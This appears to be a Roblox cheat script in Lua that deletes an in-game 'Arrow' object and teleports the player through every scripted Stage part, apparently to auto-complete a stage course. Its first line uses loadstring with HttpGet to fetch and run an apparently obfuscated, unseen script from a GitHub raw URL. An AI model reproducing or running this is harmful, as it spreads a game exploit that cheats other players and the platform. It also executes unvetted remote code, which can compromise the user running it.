loadstring(game:HttpGet("https://raw.githubusercontent.com/Wh1t3Bl4ckPT/Scripts/main/Protected_6640836446039649.lua"))()
game.Workspace.Arrow:Destroy()
local player = game.Players.LocalPlayer
local stageFolder = workspace:FindFirstChild("Stage")

if stageFolder then
    local parts = stageFolder:GetChildren() -- Get all parts inside the Stage folder
    
    for _, part in ipairs(parts) do
        if part:IsA("BasePart") then
            local script = part:FindFirstChild("Script")
            if script then
                player.Character:MoveTo(part.Position)
                wait(0.5)
            end
        end
    end
else
    print("The 'Stage' folder does not exist in the workspace.")
end